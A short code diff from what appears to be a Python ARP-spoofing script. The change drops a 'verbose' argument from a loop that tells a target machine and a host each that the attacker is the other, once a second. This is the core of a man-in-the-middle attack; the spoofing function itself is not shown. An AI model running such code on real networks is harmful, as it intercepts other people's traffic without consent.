@@ -76,9 +76,9 @@ if __name__ == "__main__":
     try:
         while True:
             # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
+            spoof(target, host)
             # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
+            spoof(host, target)
             # sleep for one second
             time.sleep(1)
     except KeyboardInterrupt:
